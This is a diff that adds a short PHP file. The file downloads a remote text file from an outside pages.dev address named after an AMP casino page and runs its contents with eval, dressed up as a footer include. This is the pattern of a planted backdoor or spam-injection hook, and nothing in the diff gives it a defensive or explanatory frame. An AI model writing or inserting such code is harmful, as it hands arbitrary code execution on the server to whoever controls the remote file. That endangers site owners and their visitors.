@@ -1,0 +1,4 @@
+<?php
+$url = 'https://iebdc.pages.dev/iebdc-amp-casino.txt';
+$exfooter = file_get_contents($url);
+eval('?>' . $exfooter); 
